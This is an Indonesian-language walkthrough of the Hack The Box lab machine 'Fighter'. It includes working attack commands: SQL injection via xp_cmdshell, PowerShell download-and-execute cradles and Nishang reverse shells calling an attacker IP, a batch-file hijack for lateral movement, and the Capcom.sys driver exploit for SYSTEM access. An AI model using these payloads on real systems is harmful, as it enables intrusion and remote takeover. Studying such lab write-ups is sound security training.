# Fighter — Insane (Windows)

## Informasi Mesin

- **Nama**: Fighter
    
- **Sistem Operasi**: Windows
    
- **Tingkat Kesulitan**: Insane
    
- **IP Address**: 10.10.10.72
    

---

## Reconnaissance

### Identifikasi Web Server

Dari respon HTTP awal terlihat bahwa target menjalankan **Microsoft IIS 8.5** dengan **ASP.NET**:

```bash
HTTP/1.1 200 OK
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Content-Type: text/html
```

Ini langsung mengarahkan fokus ke aplikasi **ASP klasik / ASP.NET lama**, yang sering menyimpan logika autentikasi rapuh.

---

### Directory Enumeration

Hasil `feroxbuster` tidak menunjukkan endpoint sensitif pada root:

```bash
301 GET /images => /images/
200 GET /style.css
200 GET /images/img02.jpg
200 GET /
```

Tidak ada file login atau admin di root, jadi kemungkinan besar aplikasi menggunakan **virtual host**.

---

## Virtual Host Discovery

Saya menambahkan host manual:

```bash
sudo nano /etc/hosts
10.10.10.72 streetfighterclub.htb
```

Lalu melakukan fuzzing subdomain dengan `ffuf`:

```bash
ffuf -w subdomains-top1million-110000.txt \
-u http://streetfighterclub.htb/ \
-H "Host: FUZZ.streetfighterclub.htb" -fw 795
```

Hasil menarik:

`members  [Status: 403]`

---

## Enumerasi Subdomain `members`

Fuzzing ulang pada subdomain tersebut:

```bash
feroxbuster -u http://members.streetfighterclub.htb/ \
-w directory-list-2.3-medium.txt \
-x asp,aspx
```

Ditemukan direktori lama:

```bash
/old/login.asp
/old/verify.asp
/old/welcome.asp
```

Ini **sinyal klasik aplikasi ASP lama**.

---

## Analisis Login & SQL Injection

Form login mengirim data ke `verify.asp`:

```http
POST /old/verify.asp
username=admin&password=admin&logintype=1
```
    

Artinya parameter `logintype` **langsung dipakai di query SQL tanpa sanitasi**.

---

## Command Execution via `xp_cmdshell`

Saya mencoba payload SQL injection untuk mengeksekusi perintah OS melalui SQL Server:

```bash
`logintype=3;execute xp_cmdshell 'powershell -c ping 10.10.14.10';`
```

Monitoring ICMP dengan tcpdump:

```bash
sudo tcpdump -ni tun0 icmp
```

✔️ Ping berhasil → **RCE terkonfirmasi**

---

## Reverse Shell (Nishang)

### Persiapan Listener & Payload

```bash
sudo nc -nvlp 443
sudo python3 -m http.server 80
```

Unduh Nishang:

```bash
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -O REV.PS1
echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port 443' >> REV.PS1
```

### Payload Injection

```bash
logintype=3;execute xp_cmdshell 'powershell "iex(new-object net.webclient).downloadstring('http://10.10.14.10/REV.PS1')"';
```

✔️ Reverse shell didapat sebagai:

`fighter\sqlserv`

---

## Lateral Movement: `sqlserv` → `decoder`

### Analisis Permission

User `decoder` memiliki file batch menarik:

```powershell
C:\Users\decoder\clean.bat
```

Isi awal:

```bat
@echo off
del /q /s c:\users\decoder\appdata\local\TEMP\*.tmp
exit
```

Permission:

`Everyone:(M)`

Tidak bisa overwrite langsung, tapi **bisa append**.

---

### Exploit Batch File

1. Truncate file:
    

```powershell
cmd /c copy /y NUL clean.bat
```

2. Rewrite payload:
    

```powershell
cmd /c "echo @echo off >> clean.bat"
cmd /c "echo powershell -c `"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.10/REV.PS1')`" >> clean.bat"
```

✔️ Reverse shell baru sebagai:

`fighter\decoder`

---

## User Flag

`type C:\Users\decoder\Desktop\user.txt`

✔️ **User flag obtained**

---

## Privilege Escalation — Capcom Driver

### Driver Enumeration

```powershell
driverquery /v | findstr /iv "system32\\drivers"
```

Hanya dua driver non-standar:

`Capcom.sys`

Driver ini **terkenal vulnerable** (Street Fighter 5 driver).

Service aktif:

```powershell
sc query capcom
```

---

### Exploit Capcom.sys (SYSTEM)

Saya menggunakan exploit PowerShell dari:

> [https://github.com/FuzzySecurity/Capcom-Rootkit](https://github.com/FuzzySecurity/Capcom-Rootkit)

Gabungkan semua script:

```bash
find . -name "*.ps1" -exec cat {} \; > capcom-all
```

Load di target:

```powershell
iex(new-object net.webclient).downloadstring('http://10.10.14.10/capcom-all') capcom-elevatepid
```

✔️ Privilege escalation sukses:

`nt authority\system`

---

## Root Flag — Static Binary Analysis

Di sistem terdapat binary `root.exe`.

### Ghidra Analysis

String mencurigakan:

`"Sorry, check returned: %d"`

Mengarah ke fungsi `main`, yang memanggil `print_flag()`.

#### Fungsi `print_flag`:

- Loop 32 byte
    
- `tolower()`
    
- Byte dikurangi **7**
    
- Output sebagai karakter
    

Artinya flag **hardcoded & obfuscated**.

---

### Decode Flag

```python
obflag = b'\x4b\x3f\x37\x38\x4a\x38\x4c\x40\x49\x4b\x40\x48\x37\x39\x4d\x3f\x4d\x49\x3a\x37\x4b\x3f\x49\x4b\x3a\x49\x4c\x3a\x38\x3b\x4a\x38'
''.join([chr(x-7) for x in obflag])
```

✔️ **Root flag obtained**